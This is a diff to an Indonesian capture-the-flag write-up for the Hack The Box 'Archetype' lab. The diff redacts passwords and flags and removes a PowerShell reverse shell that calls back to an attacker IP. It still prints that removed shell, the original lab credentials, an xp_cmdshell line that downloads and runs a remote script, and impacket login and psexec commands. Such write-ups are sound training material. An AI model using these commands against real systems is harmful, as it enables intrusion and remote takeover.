@@ -109,7 +109,7 @@ cat prod.dtsConfig
 
 **Hasil:**
 ```xml
-<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
+<ConfiguredValue>Data Source=.;Password=<REDACTED>;User ID=ARCHETYPE\sql_svc;
 Initial Catalog=Catalog;Provider=SQLNCLI10.1;</ConfiguredValue>
 ```
 
@@ -117,7 +117,7 @@ Kredensial ditemukan:
 | Info | Value |
 |------|-------|
 | Username | ARCHETYPE\sql_svc |
-| Password | M3g4c0rp123 |
+| Password | `<REDACTED>` |
 
 File `.dtsConfig` adalah file konfigurasi SSIS (SQL Server Integration Services) yang menyimpan connection string — termasuk username dan password dalam plaintext. Nama `prod` menandakan ini adalah konfigurasi **production** (sistem aktif, bukan test).
 
@@ -127,7 +127,7 @@ File `.dtsConfig` adalah file konfigurasi SSIS (SQL Server Integration Services)
 Gunakan kredensial yang ditemukan untuk login ke SQL Server menggunakan Impacket.
 
 ```bash
-impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.117.211 -windows-auth
+impacket-mssqlclient ARCHETYPE/sql_svc:<REDACTED>@10.129.117.211 -windows-auth
 ```
 
 Flag `-windows-auth` dipakai karena username menggunakan format `DOMAIN\username` — ini menandakan akun Windows/Active Directory, bukan akun SQL Server lokal.
@@ -165,8 +165,12 @@ Upgrade dari RCE per-command menjadi interactive shell. Butuh 3 terminal di Kali
 
 **Buat script reverse shell di Kali:**
 ```bash
+# Buat file shell.ps1 berisi PowerShell TCPClient reverse shell
+# Generate payload di: https://www.revshells.com
+# Pilih: PowerShell #3 (Base64) atau PowerShell Simple
+# Isi: IP = IP tun0 kamu, Port = 443
 cat > shell.ps1 << 'EOF'
-$client = New-Object System.Net.Sockets.TCPClient("10.10.15.162",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+# [paste payload dari revshells.com di sini]
 EOF
 ```
 
@@ -193,7 +197,7 @@ Port 443 dipakai agar traffic terlihat seperti HTTPS biasa dan tidak diblokir fi
 
 **Terminal 1 (MSSQL) — Trigger download & eksekusi:**
 ```sql
-EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.15.162/shell.ps1\")"';
+EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://<IP_KALI>/shell.ps1\")"';
 ```
 
 **Alur yang terjadi:**
@@ -217,7 +221,7 @@ archetype\sql_svc
 type C:\Users\sql_svc\Desktop\user.txt
 ```
 
-Flag: `3e7b102e78218**********************`
+Flag: `<REDACTED — simpan di notes pribadi>`
 
 ---
 
@@ -230,7 +234,7 @@ type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co
 
 **Hasil:**
 ```
-net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+net.exe use T: \\Archetype\backups /user:administrator <REDACTED>
 exit
 ```
 
@@ -238,7 +242,7 @@ Jackpot! Kredensial Administrator ditemukan:
 | Info | Value |
 |------|-------|
 | Username | administrator |
-| Password | MEGACORP_4dm1n!! |
+| Password | `<REDACTED>` |
 
 > **Catatan:** WinPEAS juga bisa menemukan file ini secara otomatis. Tapi mengecek PowerShell history secara manual lebih cepat dan sering kali sudah cukup.
 
@@ -248,7 +252,7 @@ Jackpot! Kredensial Administrator ditemukan:
 Gunakan kredensial Administrator untuk mendapatkan shell level SYSTEM.
 
 ```bash
-impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.129.95.187
+impacket-psexec administrator:'<REDACTED>'@10.129.95.187
 ```
 
 **Konfirmasi:**
@@ -268,14 +272,14 @@ dir
 type root.txt
 ```
 
-Flag: 
+Flag: `<REDACTED — simpan di notes pribadi>`
 
 ---
 
 ## Proof
 ```
-User Flag : 
-Root Flag : 
+User Flag : <REDACTED>
+Root Flag : <REDACTED>
 ```
 
 ---
